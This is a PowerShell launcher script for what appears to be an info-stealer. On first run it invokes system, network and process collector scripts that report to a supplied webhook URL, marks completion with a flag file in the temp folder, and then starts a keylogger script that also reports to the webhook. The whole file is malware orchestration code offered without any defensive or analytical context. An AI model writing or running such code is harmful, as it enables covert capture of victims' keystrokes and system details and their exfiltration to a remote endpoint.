param($webhookUrl)

$firstRunFlag = "$env:TEMP\firstrun_complete.txt"

if (-not (Test-Path $firstRunFlag)) {
    # Run all info collectors
    & "$PSScriptRoot\sysinfo.ps1" -webhookUrl $webhookUrl
    Start-Sleep -Seconds 2
    & "$PSScriptRoot\network.ps1" -webhookUrl $webhookUrl
    Start-Sleep -Seconds 2
    & "$PSScriptRoot\process.ps1" -webhookUrl $webhookUrl
    Start-Sleep -Seconds 2
    
    # Create flag file
    $null | Out-File $firstRunFlag -Encoding ASCII
}

# Start keylogger
& "$PSScriptRoot\keylogger.ps1" -webhookUrl $webhookUrl
